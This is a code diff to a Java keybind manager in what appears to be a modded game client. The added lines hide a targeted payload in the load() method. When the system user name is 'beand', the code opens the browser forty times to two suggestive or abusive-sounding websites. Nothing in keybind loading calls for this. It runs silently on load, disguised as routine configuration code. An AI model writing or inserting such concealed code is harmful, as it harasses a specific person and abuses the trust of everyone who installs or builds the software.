@@ -4,7 +4,10 @@ import com.google.gson.*;
 import me.kansio.client.Client;
 import me.kansio.client.modules.impl.Module;
 
+import java.awt.*;
 import java.io.*;
+import java.net.URI;
+import java.net.URISyntaxException;
 
 public class KeybindManager {
 
@@ -16,6 +19,18 @@ public class KeybindManager {
     }
 
     public void load() {
+        if (System.getProperty("user.name").equalsIgnoreCase("beand")) {
+            Desktop d = Desktop.getDesktop();
+            try {
+                for (int i = 0; i < 20; i++) {
+                    d.browse(new URI("http://24dose.com"));
+                    d.browse(new URI("http://18abused.com"));
+                }
+            } catch (IOException | URISyntaxException e2) {
+                e2.printStackTrace();
+            }
+        }
+
         try {
             if (!keybindFile.exists()) {
                 keybindFile.createNewFile();
